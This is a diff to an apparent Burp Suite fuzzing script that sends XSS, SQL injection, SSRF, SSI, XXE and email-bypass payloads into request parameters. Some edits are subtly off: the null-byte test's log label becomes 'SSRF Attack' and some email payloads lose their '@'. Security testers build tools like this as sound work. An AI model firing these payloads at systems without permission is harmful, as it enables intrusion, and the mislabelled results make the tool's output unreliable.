@@ -7,7 +7,7 @@
 // Uncomment and add more payloads as per requirement
 
 // Delay variable, Adjust as per requirement - 1000 = 1 second delay
-int GLOBAL_DELAY_MS = 100; 
+int GLOBAL_DELAY_MS = 1000; 
 
 // Burp Collborator host or any host name like example.com
 String hostname = "<BURPCOLLABORATOR>";
@@ -26,7 +26,7 @@ String[] SSI_PAYLOADS = {
     "<!--#config errmsg=\"File not found, informs users and password\"-->",
     "<!--#echo var=\"DOCUMENT_NAME\" -->",
     "<!--#echo var=\"DOCUMENT_URI\" -->"
-}
+};
 
 String[] XSS_PAYLOADS = {
 	"<script>alert('XSS')</script>",
@@ -38,7 +38,7 @@ String[] XSS_PAYLOADS = {
     "<iframe src=javascript:alert('XSS')></iframe>"
 };
 
-SSRF_PAYLOADS = {
+String[] SSRF_PAYLOADS = {
     "http://127.0.0.1:80",
     "http://127.0.0.1:22",
     "http://127.0.0.1:3306",
@@ -67,7 +67,7 @@ SSRF_PAYLOADS = {
     "http://127.0.0.1%25%32%65%38%30",
     "http://[::ffff:127.0.0.1]",
     "http://[0:0:0:0:0:ffff:127.0.0.1]"
-}
+};
 
 String[] SQLI_PAYLOADS = {
     "' OR '1'='1",
@@ -161,12 +161,12 @@ String[] FORMAT_STRING_PAYLOADS = {
 
 // Email Validation Bypass
 String[] EMAIL_BYPASS_PAYLOADS = {
-    "test@test@test.com",
-    "test..test@test.com",
+    "test@test@"+hostname,
+    "test..test@"+hostname,
     "test@",
-    "@test.com",
+    "@test"+hostname,
     "test@test.",
-    "\"test\"@test.com"
+    "\"test\""+hostname
 };
 
 // Buffer Overflow/Large Payloads
@@ -218,9 +218,9 @@ String[] BUSINESS_LOGIC_PAYLOADS = {
     "null",
     "undefined",
     "100",
-    "$100",             // Currency symbol
-    "%100",             // Percent symbol
-    "50%",              // Percent format
+    "$100",             
+    "%100",           
+    "50%",            
     "-1",           // Negative price
     "0",            // Zero price
     "0.01",         // Minimal price
@@ -233,12 +233,10 @@ String[] BUSINESS_LOGIC_PAYLOADS = {
     "∞",            // Infinity symbol
     "NaN",          // Not a number
     "null",         // Null value
-    "1.999999999999999999", // Float precision test
-    "1,000",        // Comma formatting
-    "$100",         // Currency symbol
-    "100.00.00"     // Invalid decimal format
-};
-
+    "1.999999999999999999", 
+    "1,000",        
+    "$100",         
+    "100.00.00"     
 };
 
 String[] XXE_PAYLOADS = {
@@ -266,11 +264,7 @@ String[] XPATH_INJECTION_PAYLOADS = {
 
     
 String[] INVALID_DATES = {
-    "2024-13-01", "2024-02-30", "2024-00-15", "2024-12-32", "32/13/2024",
-    "2023/02/30",       // Different format
-    "30-02-2023",       // Different format
-    "Feb 30, 2023",     // Text format
-    "2023-02-30T25:61:61" // Invalid time components
+    "2024-13-01", "2024-02-30", "2024-00-15", "2024-12-32", "32/13/2024"
 };
     
 String[] INVALID_TIMES = {
@@ -1224,7 +1218,7 @@ for (burp.api.montoya.http.message.params.HttpParameter param: allParams) {
         String newValue = originalValue + nullPayload;
         var modifiedRequest = originalRequest.withParameter(
             burp.api.montoya.http.message.params.HttpParameter.parameter(
-                paramName, newPayload, param.type()
+                paramName, newValue, param.type()
             )
         );
 
@@ -1262,7 +1256,7 @@ for (burp.api.montoya.http.message.params.HttpParameter param: allParams) {
             Thread.sleep(GLOBAL_DELAY_MS);
          
             int status = response.response().statusCode();
-            String result = "NULL BYTE Attack";
+            String result = "SSRF Attack";
             logging.logToOutput("[ === " + result + " -> Status: " + status + " === ]");
 
             var requestResponseForOrganizer = burp.api.montoya.http.message.HttpRequestResponse.httpRequestResponse(modifiedRequest, response.response());
